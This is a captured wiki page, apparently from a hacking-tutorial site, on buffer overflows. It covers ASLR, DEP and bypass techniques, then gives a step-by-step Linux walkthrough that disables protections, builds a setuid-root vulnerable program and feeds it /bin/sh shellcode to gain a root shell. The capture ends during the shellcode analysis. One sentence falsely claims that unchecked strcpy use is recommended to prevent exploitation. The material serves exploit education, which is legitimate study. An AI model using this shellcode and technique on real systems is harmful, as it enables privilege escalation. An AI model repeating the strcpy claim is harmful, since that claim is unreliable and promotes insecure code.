@@ -1,0 +1,764 @@
+http://www.blackhatlibrary.net/Buffer_Overflows
+HTTP/1.1 200 OK
+Server: cloudflare-nginx
+Date: Wed, 23 Jul 2014 03:33:03 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Set-Cookie: __cfduid=d3a23f0495a4567ba171bbde7b5547cbd1406086382106; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.blackhatlibrary.net; HttpOnly
+X-Powered-By: PHP/5.4.15
+Content-language: en
+Vary: Accept-Encoding, Cookie
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Cache-Control: private, must-revalidate, max-age=0
+CF-RAY: 14e4d0702cfa087a-IAD
+Content-Encoding: gzip
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Buffer overflow - Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</title>
+<meta name="generator" content="MediaWiki" />
+<meta name="og:title" content="Buffer overflow" />
+<meta name="og:type" content="article" />
+<meta name="og:image" content="http://www.blackhatacademy.org/security101/logo.png" />
+<meta name="og:site_name" content="Blackhat Academy - Security101 Wiki" />
+<meta name="og:description" content="For security reasons, we cannot remotely parse content.  Please visit the link provided to see the full article!" />
+<link rel="canonical" href="/Buffer_overflow" />
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="http://www.blackhatlibrary.net/api.php?action=rsd" />
+<link rel="alternate" type="application/atom+xml" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared&amp;only=styles&amp;skin=monobook&amp;*" />
+<link rel="stylesheet" href="/skins/monobook/main.css?" media="screen" />
+<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE50Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE55Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 6]><link rel="stylesheet" href="/skins/monobook/IE60Fixes.css?" media="screen" /><![endif]-->
+<!--[if IE 7]><link rel="stylesheet" href="/skins/monobook/IE70Fixes.css?" media="screen" /><![endif]--><meta name="ResourceLoaderDynamicStyles" content="" />
+<style type="text/css">/*<![CDATA[*/
+.source-c {line-height: normal;}
+.source-c li, .source-c pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for c
+ * CSS class: source-c, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.c.source-c .de1, .c.source-c .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
+.c.source-c  {font-family:monospace;}
+.c.source-c .imp {font-weight: bold; color: red;}
+.c.source-c li, .c.source-c .li1 {font-weight: normal; vertical-align:top;}
+.c.source-c .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.c.source-c .li2 {font-weight: bold; vertical-align:top;}
+.c.source-c .kw1 {color: #b1b100;}
+.c.source-c .kw2 {color: #000000; font-weight: bold;}
+.c.source-c .kw3 {color: #000066;}
+.c.source-c .kw4 {color: #993333;}
+.c.source-c .co1 {color: #666666; font-style: italic;}
+.c.source-c .co2 {color: #339933;}
+.c.source-c .coMULTI {color: #808080; font-style: italic;}
+.c.source-c .es0 {color: #000099; font-weight: bold;}
+.c.source-c .es1 {color: #000099; font-weight: bold;}
+.c.source-c .es2 {color: #660099; font-weight: bold;}
+.c.source-c .es3 {color: #660099; font-weight: bold;}
+.c.source-c .es4 {color: #660099; font-weight: bold;}
+.c.source-c .es5 {color: #006699; font-weight: bold;}
+.c.source-c .br0 {color: #009900;}
+.c.source-c .sy0 {color: #339933;}
+.c.source-c .st0 {color: #ff0000;}
+.c.source-c .nu0 {color: #0000dd;}
+.c.source-c .nu6 {color: #208080;}
+.c.source-c .nu8 {color: #208080;}
+.c.source-c .nu12 {color: #208080;}
+.c.source-c .nu16 {color:#800080;}
+.c.source-c .nu17 {color:#800080;}
+.c.source-c .nu18 {color:#800080;}
+.c.source-c .nu19 {color:#800080;}
+.c.source-c .me1 {color: #202020;}
+.c.source-c .me2 {color: #202020;}
+.c.source-c .ln-xtra, .c.source-c li.ln-xtra, .c.source-c div.ln-xtra {background-color: #ffc;}
+.c.source-c span.xtra { display:block; }
+
+/*]]>*/
+</style>
+<style type="text/css">/*<![CDATA[*/
+@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
+/*]]>*/
+</style></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Buffer_overflow skin-monobook">
+<div id="globalWrapper">
+<div id="column-content"><div id="content">
+	<a id="top"></a>
+	<div id="siteNotice"><div id="localNotice"><div align="right"><i>Questions about this topic? <a href="/Special:UserLogin" title="Special:UserLogin">Sign up</a> to ask in the talk tab</i>.</div><br />
+</div></div>	<div align="center" id="ad"><script type="text/javascript"><!--
+google_ad_client = "ca-pub-3100048614381705";
+google_ad_slot = "3567986077";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+	<h1 id="firstHeading" class="firstHeading">Buffer overflow</h1>
+	<div id="bodyContent">
+		<div id="siteSub">From Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</div>
+		<div id="contentSub">(Redirected from <a href="/index.php?title=Buffer_Overflows&amp;redirect=no" title="Buffer Overflows">Buffer Overflows</a>)</div>
+		<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>
+		<!-- start content -->
+<p><b>Buffer overflow</b>, or <b>Buffer Overrun</b> is a <a href="/Application" title="Application">software</a> error triggered when a program does not adequately control the amount of data that is copied over the <a href="/Buffer" title="Buffer">buffer</a>, if this amount exceeds the preassigned capacity, remaining <a href="/Byte" title="Byte">bytes</a> are stored in adjacent memory areas by overwriting its original content. This can be exploited by overwriting a fuction's <a href="/Return_address" title="Return address">return address</a> to cause arbitrary code execution and allow access to a <a href="/Vulnerability" title="Vulnerability">vulnerable</a> system. 
+</p>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>This is an introductory article to buffer overflows.  <a href="/Bleeding_Life" title="Bleeding Life">Bleeding Life</a> is an example of a project containing buffer overflows that bypass <a href="/ASLR" title="ASLR">ASLR</a> and <a href="/DEP" title="DEP">DEP</a> for Windows 7.
+</td></tr></table>
+<table style="text-align:center; background: #fff; border: 1px solid #000; width: 50%; margin: 5px auto;">
+<tr>
+<td><i>Buffer overflow requires a basic understanding of <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">assembly</a> and <a href="/Machine_code" title="Machine code">machine code</a>.</i>
+</td></tr></table>
+<p><br />
+<font size="-2">Special thanks to <a href="/User:Teknical" title="User:Teknical">Teknical</a> for his contributions to this article.</font>
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="#Description"><span class="tocnumber">1</span> <span class="toctext">Description</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="#Defenses"><span class="tocnumber">2</span> <span class="toctext">Defenses</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="#ASLR"><span class="tocnumber">2.1</span> <span class="toctext">ASLR</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="#DEP"><span class="tocnumber">2.2</span> <span class="toctext">DEP</span></a></li>
+<li class="toclevel-2 tocsection-5"><a href="#Containers"><span class="tocnumber">2.3</span> <span class="toctext">Containers</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="#Bypassing_protections"><span class="tocnumber">2.4</span> <span class="toctext">Bypassing protections</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-7"><a href="#Maximum_effectiveness"><span class="tocnumber">3</span> <span class="toctext">Maximum effectiveness</span></a></li>
+<li class="toclevel-1 tocsection-8"><a href="#Causes"><span class="tocnumber">4</span> <span class="toctext">Causes</span></a></li>
+<li class="toclevel-1 tocsection-9"><a href="#Example"><span class="tocnumber">5</span> <span class="toctext">Example</span></a>
+<ul>
+<li class="toclevel-2 tocsection-10"><a href="#Disabling_ASLR"><span class="tocnumber">5.1</span> <span class="toctext">Disabling ASLR</span></a></li>
+<li class="toclevel-2 tocsection-11"><a href="#Test_application"><span class="tocnumber">5.2</span> <span class="toctext">Test application</span></a>
+<ul>
+<li class="toclevel-3 tocsection-12"><a href="#bof.c"><span class="tocnumber">5.2.1</span> <span class="toctext">bof.c</span></a></li>
+<li class="toclevel-3 tocsection-13"><a href="#Compiling"><span class="tocnumber">5.2.2</span> <span class="toctext">Compiling</span></a>
+<ul>
+<li class="toclevel-4 tocsection-14"><a href="#Potential_compile-time_protections"><span class="tocnumber">5.2.2.1</span> <span class="toctext">Potential compile-time protections</span></a></li>
+<li class="toclevel-4 tocsection-15"><a href="#Solution_for_test_application"><span class="tocnumber">5.2.2.2</span> <span class="toctext">Solution for test application</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-16"><a href="#Testing"><span class="tocnumber">5.3</span> <span class="toctext">Testing</span></a>
+<ul>
+<li class="toclevel-3 tocsection-17"><a href="#On_x86"><span class="tocnumber">5.3.1</span> <span class="toctext">On x86</span></a></li>
+<li class="toclevel-3 tocsection-18"><a href="#On_x86-64"><span class="tocnumber">5.3.2</span> <span class="toctext">On x86-64</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-19"><a href="#Disabling_DEP"><span class="tocnumber">5.4</span> <span class="toctext">Disabling DEP</span></a></li>
+<li class="toclevel-2 tocsection-20"><a href="#Debugging"><span class="tocnumber">5.5</span> <span class="toctext">Debugging</span></a>
+<ul>
+<li class="toclevel-3 tocsection-21"><a href="#Shellcode_analysis"><span class="tocnumber">5.5.1</span> <span class="toctext">Shellcode analysis</span></a>
+<ul>
+<li class="toclevel-4 tocsection-22"><a href="#On_x86_2"><span class="tocnumber">5.5.1.1</span> <span class="toctext">On x86</span></a></li>
+<li class="toclevel-4 tocsection-23"><a href="#On_x86-64_2"><span class="tocnumber">5.5.1.2</span> <span class="toctext">On x86-64</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3 tocsection-24"><a href="#Finding_the_return_address"><span class="tocnumber">5.5.2</span> <span class="toctext">Finding the return address</span></a>
+<ul>
+<li class="toclevel-4 tocsection-25"><a href="#On_x86_3"><span class="tocnumber">5.5.2.1</span> <span class="toctext">On x86</span></a></li>
+<li class="toclevel-4 tocsection-26"><a href="#On_x86-64_3"><span class="tocnumber">5.5.2.2</span> <span class="toctext">On x86-64</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-27"><a href="#Exploitation"><span class="tocnumber">5.6</span> <span class="toctext">Exploitation</span></a>
+<ul>
+<li class="toclevel-3 tocsection-28"><a href="#On_x86_4"><span class="tocnumber">5.6.1</span> <span class="toctext">On x86</span></a></li>
+<li class="toclevel-3 tocsection-29"><a href="#On_x86-64_4"><span class="tocnumber">5.6.2</span> <span class="toctext">On x86-64</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Description">Description</span></h2>
+<p>A computer receives <a href="/Input" title="Input">input</a>, recalls what to do with the <a href="/Input" title="Input">input</a>, and then does it. If an attacker on the internet could control the memory of a computer, the computer would remember the wrong thing to do, and execute it because it doesn't know any better. This is what happens during a buffer overflow attack.
+</p><p>The memory of a computer is much like a post office. Each piece of mail goes to a mailbox or a P.O. box, and each P.O. box can only hold one piece of mail at a time. Suppose for a moment that the post office that represents the computer's memory has 500 P.O. boxes. Boxes 1-200 are for data that the user sends into the computer, and boxes 201-500 hold instructions for what to do with that data. 
+If a user sends in 300 pieces of data or mail, there are two scenarios:
+1. A secure program would tell the user "I can only hold 200 pieces, I'm not taking any more mail".
+2. An insecure program would simply take all the data into boxes 1-300. 
+</p>
+In the insecure scenario, when the computer remembers what to do, it lands on P.O. box 201. If the user was an attacker, malicious instructions at P.O. box 201 would be executed! This is why the buffer overflow is such a dangerous <a href="/Vulnerability" title="Vulnerability">vulnerability</a>. <div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> Though it is a dying attack vector, the buffer overflow is still very prominent today.</div>
+<p>In all actuality, there is a <a href="/Return_address" title="Return address">return address</a> that the computer uses to remember where its instructions are. So if an attacker filled up P.O. boxes 1-201, and 201 contained the return address, and the attacker changed the return address to P.O. box 1, the computer would execute the data instead of just keeping it in memory. This means that the attacker has to know enough about the system to know what address the malicious instructions are going to, because otherwise the attacker will not know the correct return address to put into P.O. Box 201. This means that the attacker has to have precise aim, or the attack will be unsuccessful.
+</p>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> Debuggers such as <b>IDA Pro, kgdb, gdb</b>, and <b>ollydbg</b> are very helpful for finding the correct <a href="/Return_address" title="Return address">return pointer</a> for the <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a>.</div>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Defenses">Defenses</span></h2>
+<h3> <span class="mw-headline" id="ASLR"><a href="/ASLR" title="ASLR">ASLR</a></span></h3>
+<p>There are multiple defenses that have been incorporated into runtime in an attempt to fight buffer overflows and prevent them from taking place. One of the most recent defense mechanisms is called <a href="/ASLR" title="ASLR">ASLR</a>, which stands for <a href="/ASLR" title="ASLR">Address Space Layout Randomization</a>. It makes it so every time the computer reboots and every time a program runs, the address space that it lives in changes. In other words, following the mailbox analogy, the return address will never be in the same mailbox. The point of this is to try to prevent an attacker from performing a buffer overflow exploit because the attacker can never aim properly. Unfortunately, attackers have discovered something called "Magic Numbers", which tricks the error handler for programs and allows an attacker to aim his attack correctly without having to know a return address.  Some <a href="/Bleeding_Life" title="Bleeding Life">key failures</a> of <a href="/ASLR" title="ASLR">ASLR</a> include that certain <a href="/Operating_System" title="Operating System">Operating Systems</a> (such as <b>Windows 7</b>) dynamically disable it for non-compatible libraries.
+</p>
+<h3> <span class="mw-headline" id="DEP"><a href="/DEP" title="DEP">DEP</a></span></h3>
+<p>Another defense mechanism that has been implemented is called <a href="/DEP" title="DEP">DEP</a>, which stands for <a href="/DEP" title="DEP">Data Execution Prevention</a>. This is an attempt to prevent the return address from being changed into something in the same memory space as the data, and also prevent <a href="/Machine_code" title="Machine code">machine code</a> (the code that buffer overflows are crafted in) from being placed into data segments.  <a href="/Return_Oriented_Programming_(ROP)" title="Return Oriented Programming (ROP)">Return_Oriented_Programming_(ROP)</a> is used when defeating modern <a href="/DEP" title="DEP">DEP</a>.
+</p><p>To combat additional filters, attackers have developed <a href="/Alphanumeric_shellcode" title="Alphanumeric shellcode" class="mw-redirect">polymorphic and multi-architecture alphanumeric shellcode</a> and <a href="/Ascii_shellcode" title="Ascii shellcode">polymorphic ASCII</a> <a href="/Machine_code" title="Machine code">machine code</a> and <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcodes</a>. ASCII and Polymorphic ASCII code looks to many filters like normal user <a href="/Input" title="Input">input</a> instead of malicious <a href="/Binary" title="Binary" class="mw-redirect">binary</a> or <a href="/Machine_code" title="Machine code">machine code</a>.
+</p>
+<h3> <span class="mw-headline" id="Containers">Containers</span></h3>
+An even further defense mechanism is called a container, which is another layer of <a href="/DEP" title="DEP">Data Execution Prevention</a>. The container attempts to identify all possible results of code from data within the buffer (or the data segment) and then prevent the <a href="/Applications" title="Applications" class="mw-redirect">application</a> from calling external functions in shared objects from the inside of the buffer. A version of this has been implemented in Cisco Security Agent, or <a href="/CSA" title="CSA">CSA</a>.  Linux's GrSec and PaX kernel patches also implement their own version of contained memory space.  <div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> As attacks become more and more sophisticated, so do hardware and software prevention mechanisms.  Notice something outdated?  Visit our <a href="/IRC" title="IRC" class="mw-redirect">IRC</a> and tell us about it!</div>
+<h3> <span class="mw-headline" id="Bypassing_protections">Bypassing protections</span></h3>
+<p>So with <a href="/CSA" title="CSA">CSA</a>, <a href="/ASLR" title="ASLR">ASLR</a>, and Operating-System supplied <a href="/DEP" title="DEP">DEP</a>, successfully performing a buffer overflow exploit against a system can be extremely difficult. Any attacker who makes it to the point where <a href="/CSA" title="CSA">CSA</a> catches it is already very advanced. To successfully subvert <a href="/ASLR" title="ASLR">ASLR</a>, <a href="/DEP" title="DEP">DEP</a> and containers one must use <a href="/Polymorphic" title="Polymorphic">polymorphic</a> <a href="/Ascii_shellcode" title="Ascii shellcode">ASCII shellcode</a> and return-oriented programming.  Return-oriented programming is used to evade the NX bit and XD bits, a type of hardware DEP implemented directly into processors.  <a href="/Machine_code" title="Machine code">Machine code</a> that self-modifies as well as looks like standard user <a href="/Input" title="Input">input</a> and has all of its own functions built into its own code, in a return-oriented fashion, is required to bypass modern-day host level buffer overflow defense standards.  The return address must always be specified in normal hexadecimal format, so it will usually look like some really funny characters, like squares or like strange symbols. The <a href="/IDS" title="IDS">IDS</a> or <a href="/HIDS" title="HIDS">HIDS</a> Context Buffer will show four squares or symbols on the end in a real buffer overflow exploit attempt on 32-bit systems, and eight squares or symbols on the end on a 64-bit system.  
+</p>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td>Learning to <a href="/Assembly_Basics#Counting" title="Assembly Basics" class="mw-redirect">count</a> in hex and <a href="/Bitwise_Math" title="Bitwise Math" class="mw-redirect">bitwise math</a> will tell you more about the sizes.
+</td></tr></table>
+<h2> <span class="mw-headline" id="Maximum_effectiveness">Maximum effectiveness</span></h2>
+<p>Many times <a href="/Firewall" title="Firewall">firewall</a> rules will prevent any connections outgoing from a server machine and prevent all incoming connections except for connections on the specified server port. Because of this, attackers use what is called <b>Second Stage Shellcode</b> to first find the connection that the exploit originated from, and then send the output of the arbitrary functions back along the first connection. This is done to circumvent <a href="/Firewall" title="Firewall">firewalls</a> and prevent a <a href="/Firewall" title="Firewall">firewall</a> from blocking a connection.
+</p><p>Buffer overflows can be used remotely to gain partial or total systems access, or they can be used locally to escalate privileges and permissions segments inside of the operating system in order to gain system or root level access. The real threat that a buffer overflow causes is what is called the "<a href="/Zero-Day_attack" title="Zero-Day attack" class="mw-redirect">Zero-Day attack</a>", also known as a buffer overflow that the <a href="/Security" title="Security">security</a> world has never seen before. <a href="/Zero-Day_attack" title="Zero-Day attack" class="mw-redirect">Zero-Day</a> or <a href="/Zero-Day_attack" title="Zero-Day attack" class="mw-redirect">0day</a> attacks are the most devastating to the <b>security industry</b>, causing worms, <a href="/Viruses" title="Viruses">viruses</a>, and sometimes even hundreds of thousands of systems to be compromised in a single day.
+</p>
+<h2> <span class="mw-headline" id="Causes">Causes</span></h2>
+<p>Buffer overflows exist because a combination of insecure language <a href="/Compiler" title="Compiler">compilers</a>, insecure <a href="/Programmer" title="Programmer">programmers</a> and bad cpu architectures that keep <a href="/Return_address" title="Return address">return address</a> from a function call in the stack. A <a href="/Programmer" title="Programmer">programmer</a> should be able to check <a href="/Input" title="Input">input</a> to the data segment with relative ease, however often times coders are either ignorant of the problem, overlook the flaw, or sometimes even a disgruntled employee might code the <a href="/Vulnerability" title="Vulnerability">vulnerability</a> into an <a href="/Applications" title="Applications" class="mw-redirect">application</a> himself for his own personal gain after the application goes to <a href="/Production" title="Production">production</a>.  
+</p>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> Bench-marking and pen-testing software in an as-you-develop fashion for proper quality assurance and control can help <b>prevent attacks</b> from a <b>malicious insider</b>.</div>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Example">Example</span></h2>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> This example is for a <b>32 bit <a href="/Linux" title="Linux">Linux</a> operating system</b> and the steps below may vary per your distribution and installation.</div>
+<h3> <span class="mw-headline" id="Disabling_ASLR">Disabling <a href="/ASLR" title="ASLR">ASLR</a></span></h3>
+<p>The first step is to disable <a href="/ASLR" title="ASLR">ASLR</a>.  This allows the featured proof of concept to be successful.  There are other methods of bypassing ASLR, but will not be covered here.
+</p>
+<pre> teknical@teknical-vm:~$ sudo -s
+ [sudo] password for teknical: 
+ root@teknical-vm:~# echo 0 &gt; /proc/sys/kernel/randomize_va_space
+ root@teknical-vm:~# exit
+ exit
+ teknical@teknical-vm:~$ 
+</pre>
+<h3> <span class="mw-headline" id="Test_application">Test application</span></h3>
+<p>The test application is below.  Note that there is a statically allocated buffer of 100 bytes.  This is what will be overflowed.  The use of strcpy on an unchecked buffer is a common procedure.  Its use is recommended to prevent applications from being exploited.
+</p>
+<h4> <span class="mw-headline" id="bof.c">bof.c</span></h4>
+<table class="wikitable" width="100%">
+<tr>
+<td>
+<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="c source-c"><pre class="de1">  <span class="co2">#include &lt;stdlib.h&gt;</span>
+  <span class="co2">#include &lt;stdio.h&gt;</span>
+  <span class="co2">#include &lt;string.h&gt;</span>
+&#160;
+  <span class="kw4">int</span> main<span class="br0">&#40;</span><span class="kw4">int</span> argc<span class="sy0">,</span> <span class="kw4">char</span> <span class="sy0">*</span>argv<span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="br0">&#123;</span>
+  	<span class="kw4">char</span> buffer<span class="br0">&#91;</span><span class="nu0">100</span><span class="br0">&#93;</span><span class="sy0">;</span>
+  	strcpy<span class="br0">&#40;</span>buffer<span class="sy0">,</span>  argv<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
+  	<span class="kw1">return</span> <span class="nu0">0</span><span class="sy0">;</span>
+  <span class="br0">&#125;</span></pre></div></div>
+</td></tr></table>
+<h4> <span class="mw-headline" id="Compiling">Compiling</span></h4>
+<p>For compilation, use the -g option of gcc to include debugging symbols in the linker, resulting in easier code execution.
+</p>
+<pre> teknical@teknical-vm:~$ gcc -g bof.c -o bof
+</pre>
+<p>Following compilation, the vulnerability can then be triggered. This example has a buffer of 100 bytes, thus a good test is 104 bytes, which will result in an overflow. Ruby is used to dynamically build a 104 byte string with perl another option. 
+</p>
+<h5> <span class="mw-headline" id="Potential_compile-time_protections">Potential compile-time protections</span></h5>
+<pre> teknical@teknical-vm:~$ ./bof `ruby -e 'print "\x90"*104'`
+ *** stack smashing detected ***: ./bof terminated
+</pre>
+<table style="border: 1px solid black; background-color: lavender; width: 100%">
+<th style="background-color: #9C7; padding: 4px">Teknical says</th>
+<tr><td style="background-color: white">By default on newer versions of gcc and other modern compilers, code is sanitized and protected at compile time.</td></tr>
+</table>
+<h5> <span class="mw-headline" id="Solution_for_test_application">Solution for test application</span></h5>
+<p>The test application must be compiled without this sanitation. Removing the stack protection from program is done by the utilization of -fno-stack-protector option with gcc. 
+</p>
+<pre> teknical@teknical-vm:~$ gcc -g -fno-stack-protector bof.c -o bof
+</pre>
+<h3> <span class="mw-headline" id="Testing">Testing</span></h3>
+<p>Setuid binary is used for this example to ensure the retrieval of a root shell.  Set up the bof binary for setuid below:
+</p>
+<pre> teknical@teknical-vm:~$ sudo chown root:root ./bof
+ teknical@teknical-vm:~$ sudo chmod 4755 ./bof
+</pre>
+<h4> <span class="mw-headline" id="On_x86">On x86</span></h4>
+<p>Following the compilation of the application, the vulnerability can be triggered once again. As stated earlier, 104 bytes are used and this is increased until the vulnerability is triggered.
+</p>
+<pre> teknical@teknical-vm:~$ ./bof `ruby -e 'print "\x90"*104'`
+ teknical@teknical-vm:~$ ./bof `ruby -e 'print "\x90"*108'`
+ teknical@teknical-vm:~$ ./bof `ruby -e 'print "\x90"*112'`
+ Segmentation fault
+</pre>
+<p>Note that it took 112 bytes to successfully overwrite the saved ebp of the running application.  The system is now prepared for attempts of exploitation.  Note, that 116 bytes are required to overwrite the return address on the stack.
+</p>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> These extra <a href="/Byte" title="Byte">bytes</a> are other <a href="/Assembly_Basics#Instructions_.26_Concepts" title="Assembly Basics" class="mw-redirect">registers</a> and sometimes <a href="/Assembly_Basics#Special_Registers" title="Assembly Basics" class="mw-redirect">special registers</a>.  These are also overwritten.</div>
+<h4> <span class="mw-headline" id="On_x86-64">On x86-64</span></h4>
+<p>This number will vary on x86-64...
+</p>
+<pre> xo@kingmaker:~$ ./bof `perl -e 'print "\x90" x 100'`
+ xo@kingmaker:~$ ./bof `perl -e 'print "\x90" x 110'`
+ xo@kingmaker:~$ ./bof `perl -e 'print "\x90" x 120'`
+ Segmentation fault
+ xo@kingmaker:~$ ./bof `perl -e 'print "\x90" x 119'`
+</pre>
+<p>On x86-64 it takes 120 bytes to trigger a segfault. Another important difference is that the return address will be placed in the 8 byte rip register, not the 4 byte eip register.
+</p>
+<h3> <span class="mw-headline" id="Disabling_DEP">Disabling DEP</span></h3>
+<p><a href="/DEP" title="DEP">DEP</a> is another protection scheme which prevents code in the stack from being executed. 'execstack' is used to check the status of and set the binary to have an executable stack.
+</p>
+<table style="border: 1px solid black; background-color: lavender; width: 100%">
+<th style="background-color: #9C7; padding: 4px">Xochipilli says</th>
+<tr><td style="background-color: white">Gcc's `-z execstack' parameter can be used to set the stack as executable at compile time</td></tr>
+</table>
+<p>The -q option will query the current status.
+</p>
+<pre> teknical@teknical-vm:~$ sudo execstack -q bof
+ - bof
+</pre>
+<p>Notice the -, which means that the application will NOT have an executable stack.  This will prevent successful exploitation.
+</p><p>The -s option is used to set the binary to allow execution on the stack.
+</p>
+<pre> teknical@teknical-vm:~$ sudo execstack -s bof
+</pre>
+<p>If queried again, an X will appear in its place, which means that the stack is now executable.
+</p>
+<pre> teknical@teknical-vm:~$ sudo execstack -q bof
+ X bof
+</pre>
+<h3> <span class="mw-headline" id="Debugging">Debugging</span></h3>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> <b>gdb</b> is required for the following sections, installed using the package manager</div>
+<p>The next step is to start up gdb and begin debugging.
+</p>
+<h4> <span class="mw-headline" id="Shellcode_analysis">Shellcode analysis</span></h4>
+<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
+<tr>
+<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
+</td>
+<td><a href="/Shellcode" title="Shellcode" class="mw-redirect">Shellcode</a> is <a href="/Machine_code" title="Machine code">machine code</a> for a flat binary execution during exploitation of a buffer overflow exploit.
+</td></tr></table>
+<h5> <span class="mw-headline" id="On_x86_2">On x86</span></h5>
+<p>The following will be used as the argument to the test application:
+</p>
+<pre> <b>`ruby -e 'print "\x90"*60,</b>
+ <b>"\xeb\x1f\x5e\x89\x76\x08</b>
+ <b>\x31\xc0\x88\x46\x07\x89</b>
+ <b>\x46\x0c\xb0\x0b\x89\xf3</b>
+ <b>\x8d\x4e\x08\x8d\x56\x0c</b>
+ <b>\xcd\x80\x31\xdb\x89\xd8</b>
+ <b>\x40\xcd\x80\xe8\xdc\xff</b>
+ <b>\xff\xff/bin/sh", "A"*7,</b>
+ <b>"\x41\x41\x41\x41"'` </b>
+</pre>
+There are a few things to be noted examining the shellcode above.<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> The backticks are <a href="/Bash" title="Bash">bash</a> command substitution as described in the <a href="/Bash_book" title="Bash book">bash book</a>.</div>The shell code used is 45 bytes long.  It is a setuid() + /bin/sh shellcode:
+<pre> \xeb\x1f\x5e\x89\x76\x08
+ \x31\xc0\x88\x46\x07\x89
+ \x46\x0c\xb0\x0b\x89\xf3
+ \x8d\x4e\x08\x8d\x56\x0c
+ \xcd\x80\x31\xdb\x89\xd8
+ \x40\xcd\x80\xe8\xdc\xff
+ \xff\xff/bin/sh
+</pre>
